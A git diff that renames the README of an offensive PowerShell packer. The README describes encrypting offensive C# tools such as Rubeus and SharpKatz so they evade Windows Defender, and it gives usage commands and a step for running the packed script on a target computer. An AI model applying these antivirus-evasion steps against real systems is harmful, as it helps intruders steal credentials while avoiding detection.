@@ -1,6 +1,6 @@
-### Invoke-Csharp-Packer v2.0
+### Invoke-PoSH-CsharpPacker v2.0
 --------------------------------------
-'Invoke-Csharp-Packer' allows to pack and encrypt offensive (C#) .NET executable files in order to bypass AV solutions such as Windows Defender.
+'Invoke-PoSH-CsharpPacker' allows to pack and encrypt offensive (C#) .NET executable files in order to bypass AV solutions such as Windows Defender.
 It generates an obfuscated and encrypted PowerShell script that contains the (C#) .NET executable file.
 
 #### FEATURES
@@ -15,16 +15,16 @@ It generates an obfuscated and encrypted PowerShell script that contains the (C#
 #### USAGE
   - Step 1. Generate an obfuscated & encrypted PowerShell script that contains your (C#) .NET executable file (e.g. Rubeus.exe, Sharpkatz.exe) stored locally or on a remote web server.  
 ```
-PS C:\> Import-Module ./Invoke-Csharp-Packer.ps1
-PS C:\> Invoke-Csharp-Packer -FilePath C:\path\Csharp-binary.exe -OutFile C:\path\Packed-Csharp-binary.ps1
+PS C:\> Import-Module ./Invoke-PoSH-CsharpPacker.ps1
+PS C:\> Invoke-PoSH-CsharpPacker -FilePath C:\path\Csharp-binary.exe -OutFile C:\path\Packed-Csharp-binary.ps1
 --- or ---
-PS C:\> Invoke-Csharp-Packer -FilePath C:\path\Csharp-binary.exe -OutFile C:\path\Packed-Csharp-binary.ps1 -Sandbox
+PS C:\> Invoke-PoSH-CsharpPacker -FilePath C:\path\Csharp-binary.exe -OutFile C:\path\Packed-Csharp-binary.ps1 -Sandbox
 ```
 ```
-PS C:\> Import-Module ./Invoke-Csharp-Packer.ps1
-PS C:\> Invoke-Csharp-Packer -FileUrl https://URL/Csharp-binary.exe -OutFile C:\path\Packed-Csharp-binary.ps1 
+PS C:\> Import-Module ./Invoke-PoSH-CsharpPacker.ps1
+PS C:\> Invoke-PoSH-CsharpPacker -FileUrl https://URL/Csharp-binary.exe -OutFile C:\path\Packed-Csharp-binary.ps1 
 --- or ---
-PS C:\> Invoke-Csharp-Packer -FileUrl https://URL/Csharp-binary.exe -OutFile C:\path\Packed-Csharp-binary.ps1 -Sandbox
+PS C:\> Invoke-PoSH-CsharpPacker -FileUrl https://URL/Csharp-binary.exe -OutFile C:\path\Packed-Csharp-binary.ps1 -Sandbox
 ```
   - Step 2. Download & execute the obfuscated & encrypted PowerShell script (that contains your (C#) .NET executable file) on a target Windows computer
 ```
